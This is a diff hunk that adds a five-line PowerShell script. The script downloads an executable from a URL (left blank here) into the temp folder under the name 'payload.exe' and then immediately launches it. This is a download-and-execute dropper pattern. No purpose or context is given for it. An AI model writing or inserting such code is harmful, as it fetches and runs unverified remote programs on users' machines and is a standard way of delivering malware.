@@ -1,0 +1,5 @@
+$exeUrl = ""
+$tempPath = "$env:TEMP\\payload.exe"
+
+Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing
+Start-Process $tempPath
